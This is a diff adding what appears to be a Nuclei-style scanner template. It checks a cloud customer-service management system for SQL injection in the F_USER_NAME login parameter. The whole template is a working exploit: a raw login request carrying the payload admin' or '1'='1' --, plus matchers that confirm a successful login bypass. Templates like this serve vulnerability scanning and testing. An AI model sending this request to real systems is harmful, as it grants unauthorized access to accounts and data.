@@ -1,0 +1,26 @@
+id: poc-yaml-yun-duan-kefu-f-user-name-sqli
+info:
+  name: 云端客服管理系统 F_USER_NAME SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /Cloud/LoginSubmit?F_USER_NAME=admin%27+or+%271%27%3D%271%27+--%2B&F_PASSWORD=1&TYPES=0 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "登录成功"
+          - "\"Status\":true"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
